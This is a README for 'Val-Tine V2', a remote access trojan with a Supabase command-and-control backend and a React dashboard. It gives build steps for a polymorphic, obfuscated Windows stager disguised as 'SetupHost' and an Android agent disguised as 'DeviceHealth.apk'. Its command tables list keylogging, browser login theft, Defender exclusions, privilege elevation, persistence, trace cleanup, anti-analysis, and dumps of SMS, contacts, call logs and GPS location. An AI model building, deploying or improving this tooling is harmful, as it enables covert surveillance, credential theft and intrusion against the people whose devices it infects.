# Val-Tine V2

Remote administration tool with Supabase-based C2 infrastructure. Supports Windows and Android targets with a React dashboard for management.

## Architecture

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│   Dashboard   │────▶│   Supabase   │◀────│    Agent     │
│   (React)     │     │   (C2 API)   │     │  (Go binary) │
└──────────────┘     └──────────────┘     └──────────────┘
                           ▲
                           │
                     ┌─────┴─────┐
                     │   Edge     │
                     │ Functions  │
                     └───────────┘
```

- **Dashboard** — React web UI for managing clients, sending commands, viewing results
- **Supabase** — Backend (Postgres DB + REST API + Edge Functions + Storage)
- **Windows Agent** — Go binary with polymorphic VM stager (obfus.py)
- **Android Agent** — Go binary packaged inside APK as native library

## Prerequisites

- [Go](https://go.dev/dl/) 1.21+
- [Node.js](https://nodejs.org/) 18+ & npm
- [Supabase CLI](https://supabase.com/docs/guides/cli) (`npx supabase`)
- Python 3.8+

**For Android builds:**
- [Android SDK](https://developer.android.com/studio) (build-tools, platform SDK 34)
- Java JDK 11+ (for Gradle/APK signing)
- `keytool` and `jarsigner` (included with JDK)

## Quick Start

### 1. Setup Supabase & Config

```bash
python3 setup.py
```

This interactive wizard will:
- Collect your Supabase URL and anon key
- Log into Supabase CLI
- Apply SQL migrations and deploy edge functions
- Update config files (`.env`, `main.go`)
- Create a dashboard login user
- Optionally build the Windows payload

### 2. Start the Dashboard

```bash
npm install
npm run dev
```

Open `http://localhost:5173` and log in with the credentials you set during setup.

## Building Payloads

### Windows

The Windows builder uses a 4-stage polymorphic pipeline:

```bash
python3 obfus.py
```

**Before building:** Edit `main.go` and paste your Supabase URL + anon key in the config section (search for `PASTE YOUR SUPABASE URL`).

**Stages:**
1. Compile Go agent → dual-layer encrypt (XOR + RC4) → upload to temp hosting
2. Shorten payload URL
3. Generate polymorphic VM bytecode with randomized opcodes
4. Generate polymorphic Go stager → compile to EXE

Each build produces a unique binary — different opcodes, identifiers, encryption keys, junk code.

**Output:** `SetupHost_XXX.exe` (or similar random name)

### Android

The Android builder compiles the Go agent and packages it inside a signed APK:

```bash
python3 build_android.py
```

**Config is read from `.env`** (created by `setup.py`), or pass directly:

```bash
python3 build_android.py --domain yourproject.supabase.co --apikey eyJ...
```

**Options:**
```
--domain    Primary Supabase domain
--domain2   Secondary domain (redundancy)
--apikey    Supabase anon key
--arch      Target architecture: arm64 (default), arm, x86_64, x86
--output    Output filename (default: DeviceHealth.apk)
```

**Stages:**
1. Compile Go agent for android/arm64 with config injected
2. Package as `libagent.so` in APK via Gradle
3. Sign with debug keystore (auto-generated) + v2 apksigner

**Output:** `DeviceHealth.apk`

**Install on device:**
```bash
adb install DeviceHealth.apk
```

**Android SDK setup:**
Set `ANDROID_HOME` environment variable, or the builder will auto-detect from common paths (`~/Android/Sdk`, etc.).

## Project Structure

```
├── main.go                 # Windows agent (Go)
├── obfus.py                # Windows polymorphic builder
├── build_android.py        # Android APK builder
├── setup.py                # Interactive setup wizard
├── .env                    # Supabase config (created by setup.py)
├── src/                    # Dashboard (React + Vite)
│   ├── pages/
│   │   ├── Dashboard.tsx   # Client list & management
│   │   └── Client.tsx      # Per-client command interface
│   ├── hooks/              # React hooks (useClients, etc.)
│   ├── lib/                # Utilities (commands, supabase client)
│   └── components/         # UI components
├── android/                # Android APK project
│   ├── agent/
│   │   └── main.go         # Android Go agent
│   ├── app/
│   │   ├── build.gradle
│   │   └── src/main/
│   │       ├── AndroidManifest.xml
│   │       └── java/com/devicehealth/service/
│   │           ├── MainActivity.java
│   │           ├── AgentService.java
│   │           └── BootReceiver.java
│   ├── build.gradle
│   └── settings.gradle
└── supabase/               # Supabase migrations & edge functions
    ├── migrations/
    └── functions/
```

## Agent Commands

Commands are sent from the dashboard and executed on target devices.

### Common Commands (Windows + Android)

| Command | Description |
|---------|-------------|
| `ping` | Connection test |
| `shell` | Execute shell command |
| `sysinfo` | Full system information |
| `isadmin` | Check privileges (admin/root) |
| `screenshot` | Single screenshot |
| `screenshots` | Continuous screenshots (background job) |
| `microphone` | Record audio |
| `wifi` | WiFi info and saved networks |
| `download` | Download file from target |
| `upload` | Upload file to target |
| `exfiltrate` | Bulk file exfiltration |
| `foldertree` | List directory contents |
| `persist` | Install persistence |
| `unpersist` | Remove persistence |
| `cleanup` | Clear traces |
| `sleep` | Sleep N seconds |
| `antianalysis` | VM/debugger detection report |
| `jobs` | List active background jobs |
| `kill` | Stop a background job |
| `pausejobs` | Stop all jobs |
| `resumejobs` | Resume default jobs |
| `options` | Show available commands |
| `exit` | Kill agent |

### Windows-Only Commands

| Command | Description |
|---------|-------------|
| `elevate` | UAC elevation |
| `excludec` | Add Defender exclusion for C:\\ |
| `excludeall` | Add Defender exclusions C:-G:\\ |
| `webcam` | Capture from webcam |
| `keycapture` | Start keylogger |
| `recordscreen` | Record screen video |
| `browserdb` | Exfiltrate browser databases |
| `parsebrowser` | Extract browser URLs/logins |
| `nearbywifi` | Scan nearby WiFi networks |
| `enumeratelan` | LAN discovery (ping sweep) |
| `message` | Show message box |
| `wallpaper` | Change wallpaper |
| `vnc_start` | Start remote desktop |
| `vnc_stop` | Stop remote desktop |
| `darkmode` | Switch to dark mode |
| `lightmode` | Switch to light mode |
| `shortcutbomb` | Create desktop shortcuts |
| `fakeupdate` | Open fake update page |
| `soundspam` | Play system sounds |

### Android-Only Commands

| Command | Description |
|---------|-------------|
| `contacts` | Dump contacts |
| `sms_dump` | Dump SMS messages |
| `calllog` | Dump call log |
| `apps` | List installed apps |
| `location` | Get last known location |
| `location_track` | Continuous GPS tracking |
| `clipboard` | Read clipboard |
| `camera` | Take photo |
| `toast` | Show toast message |
| `openurl` | Open URL in browser |
| `vibrate` | Vibrate device |
